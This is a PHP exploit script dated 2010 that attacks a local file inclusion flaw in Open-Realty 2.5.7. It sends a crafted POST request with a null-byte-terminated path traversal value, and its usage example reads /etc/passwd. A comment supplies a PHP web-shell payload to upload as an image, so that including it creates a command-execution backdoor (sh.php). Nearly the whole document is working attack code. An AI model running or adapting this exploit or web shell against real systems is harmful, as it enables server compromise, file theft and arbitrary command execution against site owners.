<?php
/*
 * Exploit Title: 
 * Date: 2010-08-18
 * Author: Nikola Petrov
 * Vendor: http://open-realty.org/
 * Version: 2.5.7
 */
	/*
		vulnerable: Open-Realty 2.5.7
		LFI: /index.php
		
		upload image with: <?php system("echo \"<?php if(isset(\$_GET[\"cmd\"])) system(\$_GET[\"cmd\"]); ?>\" > sh.php"); ?>
		include the image and sh.php will be generated.
		proceed with sh.php

		MAGIC_QUOTES must be 'off' and %00 must not be replaced with \0.
	*/

	print "\n\n#########################################################################\n";
	print "#LFI discovery and implementation: Nikola Petrov (vp.nikola@gmail.com)\n";
	print "#Date: 05.09.2009\n";
	print "#########################################################################\n\n";

	if($argc < 5) {
		print "usage: $argv[0] host port path file [debug: 1/0]\n";
		print "example: $argv[0] localhost 80 / ../../../../../../../../../../../../etc/passwd\n\n\n";
		exit();
	}

	$Host = $argv[1];
	$Port = $argv[2];
	$Path = $argv[3];
	$File = $argv[4];

	function HttpSend($aHost, $aPort, $aPacket) {
		$Response = "";

		if(!$Socket = fsockopen($aHost, $aPort)) {
			print "Error connecting to $aHost:$aPort\n\n";
			exit();
		}
		
		fputs($Socket, $aPacket);
		
		while(!feof($Socket)) $Response .= fread($Socket, 1024);
		
		fclose($Socket);
		
		return $Response;
	}

	$VulnRequest = "select_users_lang=". $File . "%00";
	
	$Packet  = "POST {$Path} HTTP/1.1\r\n";
	$Packet .= "Host: {$Host}\r\n";
	$Packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
	$Packet .= "Content-Length: " . strlen($VulnRequest) . "\r\n\r\n";
	$Packet .= "$VulnRequest\n";

	if($argv[5] == 1) print $Packet;

	print HttpSend($Host, $Port, $Packet);
?>